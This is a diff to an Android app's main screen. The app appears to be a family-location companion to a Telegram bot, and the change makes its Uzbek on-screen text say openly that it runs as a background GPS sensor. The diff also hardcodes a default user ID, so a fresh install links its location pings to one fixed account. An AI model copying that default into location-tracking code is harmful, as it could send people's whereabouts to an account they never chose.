@@ -138,7 +138,7 @@ public class MainActivity extends Activity {
         layout.addView(buttonsLayout);
 
         TextView descBox = new TextView(this);
-        descBox.setText("✅ Barcha ruxsatlar berildi!\n\nEndi bu ilovani yopib qo'ysangiz ham bo'ladi — u cho'ntagingizda 24/7 orqa fonda ishlab turadi.\n\n3D Uy va oila a'zolarini esa Telegram bot orqali ko'raverasiz!");
+        descBox.setText("⚠️ DIQQAT:\n\nBu ilova 3D uyga kirish uchun EMAS!\n\nBu dastur faqat Telegram yopiq paytda ham cho'ntagingizda 24/7 fon rejimida GPS datchigi bo'lib xizmat qiladi.\n\n🏠 3D Uyga esa TELEGRAM bot orqali kiriladi!");
         descBox.setTextSize(15f);
         descBox.setTextColor(Color.parseColor("#cbd5e1"));
         descBox.setGravity(Gravity.CENTER);
@@ -172,9 +172,13 @@ public class MainActivity extends Activity {
         setContentView(scrollView);
 
         String curUid = getSavedUid();
-        if (!curUid.isEmpty()) {
+        if (curUid.isEmpty()) {
+            curUid = "6280077746";
+            saveUid(curUid);
+        } else {
             sendApkPing(curUid);
         }
+        updateUserText();
         fetchAdditionalMembers(buttonsLayout);
 
         requestNeededPermissions();
@@ -363,6 +367,9 @@ public class MainActivity extends Activity {
 
     private void onForegroundPermissionsGranted() {
         startGpsService();
+        String uid = getSavedUid();
+        if (uid.isEmpty()) uid = "6280077746";
+        sendApkPing(uid);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             if (checkSelfPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                 requestPermissions(new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION}, REQ_BG_LOC);
